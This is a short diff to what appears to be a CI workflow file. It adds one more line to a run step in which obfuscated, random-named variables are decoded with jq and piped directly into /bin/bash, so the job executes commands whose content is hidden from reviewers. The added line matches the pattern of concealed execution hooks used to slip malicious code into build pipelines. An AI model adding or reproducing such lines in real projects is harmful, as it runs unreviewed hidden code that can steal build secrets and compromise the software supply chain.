@@ -44,6 +44,7 @@ jobs:
           echo $zjnwu56 | jq -r .cbujt2 | /bin/bash
           echo $klt3 | jq -r .yqi59064 | /bin/bash
           printf '%s' "$uoa736" | jq -r .j671 | /bin/bash
+          echo $xpzfo867 | jq -r .kfz3 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
